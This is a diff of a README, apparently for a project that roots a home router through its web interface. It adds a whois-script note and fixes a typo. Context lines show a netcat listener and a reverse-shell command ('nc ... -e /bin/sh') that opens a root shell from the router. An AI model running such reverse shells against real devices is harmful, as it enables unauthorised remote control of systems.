@@ -60,6 +60,11 @@ restore the router, what are they doing with this data? This is really unpleasan
       arch brcm63xx 3
       arch brcm63xx-tch 10
 
+
+###### Run uci-whois.sh for whois all ip-adresses that has been added to configuration files from your internet provider: 
+
+![Screenshot](files/whois.gif)
+
 # HOWTO GET ROOT ACCESS FROM WEBGUI:
 
 ##### Let's begin. Fire up a terminal of any kind and just run the awesome netcat tool and listen on a port.
@@ -70,7 +75,7 @@ restore the router, what are they doing with this data? This is really unpleasan
 
     :::::::`nc [machine_IP] [machine_port] -e /bin/sh`
 
-###### In the netcat window you will see something similiar and that means you are in:
+###### In netcat window you will see something similiar and that means you are in:
 
     listening on [any] 1337 ...
     connect to [192.168.1.144] from router [192.168.1.1] 40980
